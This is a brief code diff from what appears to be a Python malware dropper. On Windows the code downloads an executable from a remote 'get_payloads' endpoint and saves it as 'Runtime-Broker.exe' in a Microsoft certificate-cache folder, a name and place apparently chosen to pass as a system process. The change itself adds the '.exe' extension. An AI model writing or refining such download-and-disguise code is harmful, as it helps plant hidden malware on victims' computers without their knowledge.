@@ -125,7 +125,7 @@ def run(url, file_path):
     if os_type == 'Windows':
         import winreg
     
-        file_path = f"C:\\Users\\{user}\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\Runtime-Broker"
+        file_path = f"C:\\Users\\{user}\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData\\Runtime-Broker.exe"
         if not os.path.exists(file_path):
             response = requests.get(f"{url}get_payloads/{download_path}.exe")
             with open(file_path, 'wb') as file:
